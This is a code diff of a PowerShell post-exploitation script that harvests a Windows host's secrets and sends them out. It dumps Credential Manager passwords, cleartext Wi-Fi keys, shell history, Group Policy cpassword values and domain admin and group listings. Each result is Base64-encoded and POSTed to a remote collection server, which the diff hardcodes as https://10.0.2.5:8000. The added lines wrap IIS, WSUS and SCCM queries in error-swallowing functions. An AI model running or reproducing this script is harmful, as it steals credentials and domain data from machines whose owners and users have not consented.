@@ -6,6 +6,11 @@ param($Text);if($null -eq $Text){return "IA=="}else{$Bytes=[System.Text.Encoding
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];
 $vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password | out-string;
 
+function iis_sites_function{try {return Get-IISSite | out-string}catch {return ""}}
+function wsus_clients_function{try {return Get-WsusComputer -All | out-string}catch {return ""}}
+function wsus_server_function{try {return Get-WsusServer | out-string}catch {return ""}}
+function DOMAIN_SCCM_hunter_function{try {$sccm=([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties};return $sccm | out-string}catch {return ""}}
+
 $hostname=Encode64(hostname);
 $commands = @{
 alias = Encode64(Get-ChildItem Alias: | out-string);
@@ -30,7 +35,7 @@ history_ps = Encode64(Get-History | out-string);
 history_bis = Encode64(Get-Content (Get-PSReadlineOption).HistorySavePath | out-string); 
 hosts = Encode64(Get-Content C:\WINDOWS\System32\drivers\etc\hosts | out-string);
 ipconfig = Encode64(ipconfig /all | out-string);
-iis_sites = Encode64(Get-IISSite | out-string);
+iis_sites = Encode64(iis_sites_function);
 list_install_programs = Encode64(Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name | out-string);
 loot_pwd = Encode64(findstr /S cpassword $env:logonserver\sysvol\*.xml | out-string);
 net_accounts = Encode64(net accounts);
@@ -61,14 +66,14 @@ variables = Encode64(Get-ChildItem variable: | out-string);
 wifi_profiles = Encode64(netsh wlan show profiles | out-string);
 wifi_pwd = Encode64((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | out-string);
 whoami = Encode64(whoami /all | out-string);
-wsus_clients = Encode64(Get-WsusComputer -All | out-string);
-wsus_server = Encode64(Get-WsusServer | out-string);
+wsus_clients = Encode64(wsus_clients_function);
+wsus_server = Encode64(wsus_server_function);
 DOMAIN_net_user = Encode64(net user /domain);
 DOMAIN_net_group = Encode64(net group);
-DOMAIN_net_group_computers = Encode64(net group "Domain Computers" /domain)
-DOMAIN_net_group_admins = Encode64(net group "Domain Admins" /domain)
+DOMAIN_net_group_computers = Encode64(net group "Domain Computers" /domain);
+DOMAIN_net_group_admins = Encode64(net group "Domain Admins" /domain);
 DOMAIN_net_accounts_domain = Encode64(net accounts /domain);
-DOMAIN_SCCM_hunter = Encode64(([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties});
+DOMAIN_SCCM_hunter = Encode64(DOMAIN_SCCM_hunter_function);
 };
-$URL='SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';
+$URL='https://10.0.2.5:8000/?';
 foreach($key in $commands.Keys){$enc_command=$commands[$key];$params=@{hostname=$hostname;$key=$enc_command};$headers=@{'Proof'='1'};Invoke-WebRequest -Uri $URL -Headers $headers -Method POST -Body $params;};
